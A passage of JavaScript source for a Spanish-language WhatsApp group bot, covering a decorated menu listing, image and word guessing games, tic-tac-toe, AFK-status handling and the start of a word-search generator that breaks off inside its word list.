╿║ ➪ pokemonl   
╿║ ➪ cobblestone
╿║ ➪ joker      
╿║ ➪ americaw   
╿║ ➪ toxic   
╿║ ➪ globos
╿║ ➪ burger      
╿║ ➪ huesos   
╿║ ➪ slime   
╿║ ➪ glasss
╿║ ➪ decorative      
╿║ ➪ lava   
╿╰─═─-───• ◆ • ─═─═
║
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐌𝐄𝐍𝐔 𝐒𝐎𝐔𝐍𝐃⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ sound1                                 
╿║ ➪ sound2
╿║ ➪ sound3  
╿║ ➪ sound4   
╿║ ➪ sound5   
╿║ ➪ sound6   
╿║ ➪ sound7      
╿║ ➪ sound8   
╿║ ➪ sound9  
╿║ ➪ sound10  
╿║ ➪ sound11   
╿║ ➪ sound12                                 
╿║ ➪ sound13
╿║ ➪ sound14   
╿║ ➪ sound15   
╿║ ➪ sound16   
╿║ ➪ sound17   
╿║ ➪ sound18   
╿║ ➪ sound19   
╿║ ➪ sound20   
╿║ ➪ sound21  
╿║ ➪ sound22   
╿║ ➪ sound23                                 
╿║ ➪ sound24
╿║ ➪ sound25   
╿║ ➪ sound26   
╿║ ➪ sound27   
╿║ ➪ sound28   
╿║ ➪ sound29   
╿║ ➪ sound30 
╿║ ➪ sound31                                 
╿║ ➪ sound32
╿║ ➪ sound33  
╿║ ➪ sound34   
╿║ ➪ sound35   
╿║ ➪ sound36   
╿║ ➪ sound37      
╿║ ➪ sound38   
╿║ ➪ sound39  
╿║ ➪ sound40  
╿║ ➪ sound41   
╿║ ➪ sound42                                 
╿║ ➪ sound43
╿║ ➪ sound44   
╿║ ➪ sound45   
╿║ ➪ sound46   
╿║ ➪ sound47   
╿║ ➪ sound48   
╿║ ➪ sound49   
╿║ ➪ sound50   
╿║ ➪ sound51  
╿║ ➪ sound52   
╿║ ➪ sound53                                 
╿║ ➪ sound54
╿║ ➪ sound55   
╿║ ➪ sound56   
╿║ ➪ sound57   
╿║ ➪ sound58   
╿║ ➪ sound59   
╿║ ➪ sound60 
╿║ ➪ sound61                                 
╿║ ➪ sound62
╿║ ➪ sound63  
╿║ ➪ sound64   
╿║ ➪ sound65   
╿║ ➪ sound66   
╿║ ➪ sound67      
╿║ ➪ sound68   
╿║ ➪ sound69  
╿║ ➪ sound70  
╿║ ➪ sound71   
╿║ ➪ sound72                                 
╿║ ➪ sound73
╿║ ➪ sound74   
╿║ ➪ sound75   
╿║ ➪ sound76   
╿║ ➪ sound77   
╿║ ➪ sound78   
╿║ ➪ sound79   
╿║ ➪ sound80   
╿║ ➪ sound81  
╿║ ➪ sound82   
╿║ ➪ sound83                                 
╿║ ➪ sound84
╿║ ➪ sound85   
╿║ ➪ sound86   
╿║ ➪ sound87   
╿║ ➪ sound88   
╿║ ➪ sound99   
╿║ ➪ sound90 
╿║ ➪ sound100           
╿║ ➪ sound101                         
╿║ ➪ sound102
╿║ ➪ sound103  
╿║ ➪ sound104   
╿║ ➪ sound105   
╿║ ➪ sound106   
╿║ ➪ sound107      
╿║ ➪ sound108   
╿║ ➪ sound109  
╿║ ➪ sound110  
╿║ ➪ sound111   
╿║ ➪ sound112                                 
╿║ ➪ sound113
╿║ ➪ sound114   
╿║ ➪ sound115   
╿║ ➪ sound116   
╿║ ➪ sound117   
╿║ ➪ sound118   
╿║ ➪ sound119   
╿║ ➪ sound120   
╿║ ➪ sound121  
╿║ ➪ sound122   
╿║ ➪ sound123                                 
╿║ ➪ sound124
╿║ ➪ sound125   
╿║ ➪ sound126   
╿║ ➪ sound127   
╿║ ➪ sound128   
╿║ ➪ sound129   
╿║ ➪ sound130 
╿║ ➪ sound131                                 
╿║ ➪ sound132
╿║ ➪ sound133  
╿║ ➪ sound134   
╿║ ➪ sound135   
╿║ ➪ sound136   
╿║ ➪ sound137      
╿║ ➪ sound138   
╿║ ➪ sound139  
╿║ ➪ sound140  
╿║ ➪ sound141   
╿║ ➪ sound142                                 
╿║ ➪ sound143
╿║ ➪ sound144   
╿║ ➪ sound145   
╿║ ➪ sound146   
╿║ ➪ sound147   
╿║ ➪ sound148   
╿║ ➪ sound149   
╿║ ➪ sound150   
╿║ ➪ sound151  
╿║ ➪ sound152   
╿║ ➪ sound153                                 
╿║ ➪ sound154
╿║ ➪ sound155   
╿║ ➪ sound156   
╿║ ➪ sound157   
╿║ ➪ sound158   
╿║ ➪ sound159   
╿║ ➪ sound160 
╿║ ➪ sound161                 
╿╰─═─-───• ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`

//JUEGO BANDERAS
if(isGroup && fs.existsSync(`./archivos/juegos/banderasok-${from}.json`)){
let dataBanderas = JSON.parse(fs.readFileSync(`./archivos/juegos/banderasok-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataBanderas.respuesta.slice(0,4).toUpperCase() && budy.toUpperCase() != dataBanderas.respuesta) return enviar('[⛔️] 𝗘𝗦𝗧𝗔 𝗖𝗘𝗥𝗖𝗔')
if(budy.toUpperCase() == dataBanderas.respuesta) {
const ganaBa = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : Ganó
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(ganaBa), fs.unlinkSync(`./archivos/juegos/banderasok-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./archivos/juegos/banderasok-${from}.json`, `${JSON.stringify(banderasok[Math.floor(Math.random() * banderasok.length)])}`)
let dataBan = JSON.parse(fs.readFileSync(`./archivos/juegos/banderasok-${from}.json`))
const banDd =`
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗡𝗜𝗩𝗘𝗟 :  Dificil
╿║ ➪ 𝗝𝗨𝗚𝗔𝗗𝗔 : ${dataBan.bandera}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(banDd)
}, 5000)
}}

//JUEGO DRAGON Z
if(isGroup && fs.existsSync(`./archivos/juegos/dragonz-${from}.json`)){
let dataDragonz = JSON.parse(fs.readFileSync(`./archivos/juegos/dragonz-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataDragonz.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataDragonz.original) return enviar('[⛔️] 𝗘𝗦𝗧𝗔 𝗖𝗘𝗥𝗖𝗔')
if(budy.toUpperCase() == dataDragonz.original) {
const ganaDra = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : Gano
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`

enviar(ganaDra), fs.unlinkSync(`./archivos/juegos/dragonz-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./archivos/juegos/dragonz-${from}.json`, `${JSON.stringify(dragonz[Math.floor(Math.random() * dragonz.length)])}`)
let dragon2 = JSON.parse(fs.readFileSync(`./archivos/juegos/dragonz-${from}.json`))
textoDragon =` ⛔️ 𝘼𝘿𝙄𝙑𝙄𝙉𝘼 𝙇𝘼 𝙄𝙈𝘼𝙂𝙀𝙉 \n\n¿Te consideras un verdadero fans?\n\nEntonces demuestralo aquí \n\nObserva atentamente la imagen\n\n`
dragon3 = await getBuffer(dragon2.foto)   
await sock.sendMessage(from,{image : dragon3,caption : textoDragon},{quoted: info})
}, 5000)
}}


//JUEGO MUNDO Z
if(isGroup && fs.existsSync(`./archivos/juegos/mundoZ-${from}.json`)){
let dataMundoZ = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoZ-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataMundoZ.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataMundoZ.original) return enviar('[⛔️] 𝗘𝗦𝗧𝗔 𝗖𝗘𝗥𝗖𝗔')
if(budy.toUpperCase() == dataMundoZ.original) {
const ganaOkn = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : Ganó
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(ganaOkn), fs.unlinkSync(`./archivos/juegos/mundoZ-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./archivos/juegos/mundoZ-${from}.json`, `${JSON.stringify(mundoZ[Math.floor(Math.random() * mundoZ.length)])}`)
let dataDos = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoZ-${from}.json`))
textoAdiviname =` ⛔️ 𝘼𝘿𝙄𝙑𝙄𝙉𝘼 𝙇𝘼 𝙄𝙈𝘼𝙂𝙀𝙉 \n\n¿Te consideras un verdadero fans?\n\nEntonces demuestralo aquí \n\nObserva atentamente la imagen\n\n`
wew = await getBuffer(dataDos.foto)  
await sock.sendMessage(from,{image : wew,caption : textoAdiviname},{quoted: info})
}, 5000)
}}



//MUNDO ONEPIECE
if(isGroup && fs.existsSync(`./archivos/juegos/mundoone-${from}.json`)){
let datinnnnb = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoone-${from}.json`))
if(budy.slice(0,4).toUpperCase() == datinnnnb.original.slice(0,4).toUpperCase() && budy.toUpperCase() != datinnnnb.original) return enviar('[⛔️] 𝗘𝗦𝗧𝗔 𝗖𝗘𝗥𝗖𝗔')
if(budy.toUpperCase() == datinnnnb.original) {
const ganaDrap = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : Ganó
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(ganaDrap), fs.unlinkSync(`./archivos/juegos/mundoone-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./archivos/juegos/mundoone-${from}.json`, `${JSON.stringify(mundoone[Math.floor(Math.random() * mundoone.length)])}`)
let one2 = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoone-${from}.json`))
textoOne =` [⛔️] 𝘼𝘿𝙄𝙑𝙄𝙉𝘼 𝙇𝘼 𝙄𝙈𝘼𝙂𝙀𝙉 \n\n¿Te consideras un verdadero fans?\n\nEntonces demuestralo aquí \n\nObserva atentamente la imagen\n\n`
one3 = await getBuffer(one2.foto)   
await sock.sendMessage(from,{image : one3,caption : textoOne},{quoted: info})
}, 5000)
}}
//DIFERENCIAS
if(isGroup && fs.existsSync(`./archivos/juegos/diferenciastop-${from}.json`)){
let dataDif = JSON.parse(fs.readFileSync(`./archivos/juegos/diferenciastop-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataDif.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataDif.original) return enviar('[⛔️] 𝗘𝗦𝗧𝗔 𝗖𝗘𝗥𝗖𝗔')
if(budy.toUpperCase() == dataDif.original) {
const ganaDif = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : Ganó
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(ganaDif), fs.unlinkSync(`./archivos/juegos/diferenciastop-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./archivos/juegos/diferenciastop-${from}.json`, `${JSON.stringify(diferenciastop[Math.floor(Math.random() * diferenciastop.length)])}`)
let dif2 = JSON.parse(fs.readFileSync(`./archivos/juegos/diferenciastop-${from}.json`))
textoDif =`⛔️ 𝐃𝐈𝐅𝐄𝐑𝐄𝐍𝐂𝐈𝐀𝐒 \n\nVamos concentrate\n\nYo se que tú puedes.\n\nMira bien la imagen y ve los errores.`
dif3 = await getBuffer(dif2.imagenfake)   
await sock.sendMessage(from,{image : dif3,caption : textoDif},{quoted: info})
}, 5000)
}}
// EMOJI REFRAN
if(isGroup && fs.existsSync(`./archivos/juegos/emojirefran-${from}.json`)){
let dataEmo = JSON.parse(fs.readFileSync(`./archivos/juegos/emojirefran-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataEmo.respuesta.slice(0,4).toUpperCase() && budy.toUpperCase() != dataEmo.respuesta) return enviar('[⛔️] 𝗘𝗦𝗧𝗔 𝗖𝗘𝗥𝗖𝗔')
if(budy.toUpperCase() == dataEmo.respuesta) {
const ganaEmo = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : Ganó
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(ganaEmo), fs.unlinkSync(`./archivos/juegos/emojirefran-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./archivos/juegos/emojirefran-${from}.json`, `${JSON.stringify(emojirefran[Math.floor(Math.random() * emojirefran.length)])}`)
let difEmo = JSON.parse(fs.readFileSync(`./archivos/juegos/emojirefran-${from}.json`))
textoEmo =`
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗝𝗨𝗚𝗔𝗗𝗔 : ${difEmo.refran}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(textoEmo)
}, 5000)
}}

//JUEGO MUNDO NARUTO
if(isGroup && fs.existsSync(`./archivos/juegos/mundoNaruto-${from}.json`)){
let datamundoNaruto = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoNaruto-${from}.json`))
if(budy.slice(0,4).toUpperCase() == datamundoNaruto.original.slice(0,4).toUpperCase() && budy.toUpperCase() != datamundoNaruto.original) return enviar('[⛔️] 𝗘𝗦𝗧𝗔 𝗖𝗘𝗥𝗖𝗔')
if(budy.toUpperCase() == datamundoNaruto.original) {
const ganaOkn = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : Ganó
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(ganaOkn), fs.unlinkSync(`./archivos/juegos/mundoNaruto-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./archivos/juegos/mundoNaruto-${from}.json`, `${JSON.stringify(mundoNaruto[Math.floor(Math.random() * mundoNaruto.length)])}`)
let dataDoss = JSON.parse(fs.readFileSync(`./archivos/juegos/mundoNaruto-${from}.json`))
textoAdiviname =` ⛔️ 𝘼𝘿𝙄𝙑𝙄𝙉𝘼 𝙇𝘼 𝙄𝙈𝘼𝙂𝙀𝙉 \n\n¿Te consideras un verdadero fans?\n\nEntonces demuestralo aquí \n\nObserva atentamente la imagen\n\n`
wew = await getBuffer(dataDoss.foto)  
await sock.sendMessage(from,{image : wew,caption : textoAdiviname},{quoted: info})
}, 5000)
}}

//JUEGO ANAGRAMA
if(isGroup && fs.existsSync(`./archivos/juegos/anagramaok-${from}.json`)){
let dataAnagrama = JSON.parse(fs.readFileSync(`./archivos/juegos/anagramaok-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return enviar('⛔️ 𝗘𝗦𝗧𝗔 𝗖𝗘𝗥𝗖𝗔')
if(budy.toUpperCase() == dataAnagrama.original) {
const ganaAn = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : Ganó
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(ganaAn), fs.unlinkSync(`./archivos/juegos/anagramaok-${from}.json`)		
setTimeout(async() => {
fs.writeFileSync(`./archivos/juegos/anagramaok-${from}.json`, `${JSON.stringify(anagramaok[Math.floor(Math.random() * anagramaok.length)])}`)
let dataAna = JSON.parse(fs.readFileSync(`./archivos/juegos/anagramaok-${from}.json`))
const anaDd =`
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${pushname}
╿║ ➪ 𝗡𝗜𝗩𝗘𝗟 :  Dificil
╿║ ➪ 𝗝𝗨𝗚𝗔𝗗𝗔 : ${dataAna.fake}
╿║ ➪ 𝗘𝗦𝗧𝗔𝗗𝗢 : ${dataAna.pista}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
enviar(anaDd)
}, 5000)
}}

//JUEGO DE 3 EN RAYA
async function joguinhodavelha() {
if(joguinhodavelhajs2.includes(from) || joguinhodavelhajs.includes(sender)) {
const cmde = body.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
if (fs.existsSync(`./archivos/juegos/${from}.json`)) {
const boardnow = setGame(`${from}`);
if (body == "Cex") return enviar("why");
if (
body.toLowerCase() == "si" ||
body.toLowerCase() == "SI" ||
body.toLowerCase() == "S" ||
body.toLowerCase() == "ok"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return enviar(`él juego ya empezó antes!`);
const matrix = boardnow._matrix;
boardnow.status = true;
fs.writeFileSync(`./archivos/juegos/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const chatAccept = `*🎮𝐓𝐑𝐄𝐒 𝐑𝐀𝐘𝐀𝐒̸🕹️*
    
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
 
Su turno... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
sock.sendMessage(from, {text: chatAccept}, {quoted: info,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net", 
],
},
});
}
} else if (
body.toLowerCase() == "no" ||
body.toLowerCase() == "NO" ||
body.toLowerCase() == "N" ||   
body.toLowerCase() == "noo"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return enviar(`El Juego ya comenzo!`);
fs.unlinkSync(`./archivos/juegos/${from}.json`);
 sock.sendMessage(from, {text:
 `@${boardnow.X} *_Rayos su oponente no acepto el desafio ❌😕_*`}, {quoted: info,
 contextInfo: {
 mentionedJid: [boardnow.X + "@s.whatsapp.net"],
},
}
);
joguinhodavelhajs.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}
}
}

if (arrNum.includes(cmde)) {
const boardnow = setGame(`${from}`);
if (!boardnow.status) return enviar(`Parece que su oponente no acepto el desafio...`)
if (
(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
     
sender.replace("@s.whatsapp.net", "")
)
return;
const moving = validmove(Number(body), `${from}`);
const matrix = moving._matrix;
if (moving.isWin) {
if (moving.winner == "SERI") {
const chatEqual = `*🎮𝐓𝐑𝐄𝐒 𝐑𝐀𝐘𝐀𝐒̸🕹️*
  
El Juego terminá en empate😐
`;
enviar(chatEqual);
fs.unlinkSync(`./archivos/juegos/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
return;
}
const abt = Math.ceil(Math.random() + 1)
const winnerJID = moving.winner == "O" ? moving.O : moving.X;
const looseJID = moving.winner == "O" ? moving.X : moving.O;
const limWin = Math.floor(Math.random() * 1) + 1;
const limLoose = Math.floor(Math.random() * 1) + 1;
const chatWon = `*🎮𝐓𝐑𝐄𝐒 𝐑𝐀𝐘𝐀𝐒̸🕹️*
  
El ganador es : @${winnerJID} 😎👑
`;
sock.sendMessage(from, {text: chatWon}, {quoted: info,
contextInfo: {
mentionedJid: [
moving.winner == "O" ?
moving.O + "@s.whatsapp.net" :
moving.X + "@s.whatsapp.net",
],
},
});
setTimeout( () => {
if (fs.existsSync("./archivos/juegos/" + from + ".json")) {
 fs.unlinkSync("./archivos/juegos/" + from + ".json");
console.log(`*🕹️JUEGO DE 3 EN RAYA REINICIADO...🕹️*`);
 } else {
console.log(color(time, "red"), color("[ ESPIRADO ]", "magenta"), color('3 en rayas reiniciado', "red"));
 }
joguinhodavelhajs.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}, 300000) //5 minutos
enviar(`_*🥳Felicidades @${winnerJID} usted gano`)      
fs.unlinkSync(`./archivos/juegos/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./archivos/juegos/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
const chatMove = `*🎮𝐓𝐑𝐄𝐒 𝐑𝐀𝐘𝐀𝐒̸🕹️*
  
❌ : @${moving.X}
⭕ : @${moving.O}

Su turno : @${moving.turn == "X" ? moving.X : moving.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
sock.sendMessage(from, {text: chatMove}, {quoted: info,
contextInfo: {
mentionedJid: [
moving.X + "@s.whatsapp.net",
moving.O + "@s.whatsapp.net",
],
},
});
}
} 
} 
}

joguinhodavelha()
  if (isGroup && !info.key.fromMe) {
  
                        let mentionUser = [...new Set([...(info.mentionedJid || []), ...(info.quoted ? info.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net')])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    enviar(`No lo etiquetes, está enojado\n\n*Razón:* ${getReason2}`)
                }
            }
                                                                           
            if (afk.checkAfkUser(sender, _afk)) {
                let getId = afk.getAfkId(sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(sender, _afk), 1)
                fs.writeFileSync('./archivos/funciones/afk-user.json', JSON.stringify(_afk))
                sock.sendTextWithMentions(from, `@${sender.split('@')[0]} ha regresado de afk`, info)
            }
        }
if (!userSP) {
userSP = sender.split("@")[0]
}
// Sopa de letras
async function generarSopaDeLetras() {
const LADO = 16 // Si es alto o bajo, puede dar error, deja como esta
let sopaDeLetras = new Array(LADO);
  
for (let i = 0; i < LADO; i++) {
sopaDeLetras[i] = new Array(LADO)
}
  
const PALABRAS = ['ALGORITMOS', 'ANDROID', 'ANIME', 'ARQUITECTO', 'ARTE', 'ASTRONOMIA', 'AVATAR', 'BIOLOGIA', 'CARTOGRAFIA', 'CINEMATICA', 'CIENCIA', 'CODIFICAR', 'CRUCIGRAMA', 'CRUCIVERBA', 'CUADRO', 'DISENADOR', 'ECONOMIA', 'EINSTEIN', 'ENCICLOPEDIA', 'ESTADOS', 'STUDIOS', 'SUDOKU', 'TAICHI', 'TECNOLOGIA', 'TERMINATOR', 'TETRIS', 'LEGENDZELDA', 'TIKTOK', 'TURING', 'UNIVERSO', 'VIDEOJUEGOS', 'VIRUS', 'WARCRAFT', 'WHATSAPP', 'XBOX', 'XENOVERSE', 'YOGA', 'YOUTUBE', 'ZELDA', 'ZENON', 'ANATOMIA', 'ATLETISMO', 'BACTERIA', 'BOTANICA', 'CATALOGAR', 'DANZA', 'DETECCION', 'DRAGONBALL', 'ELECTRONICA', 'ESPACIO', 'EVOLUCION', 'FANTASMAS', 'FICCION', 'FOTOGRAFIA', 'GATABOT', 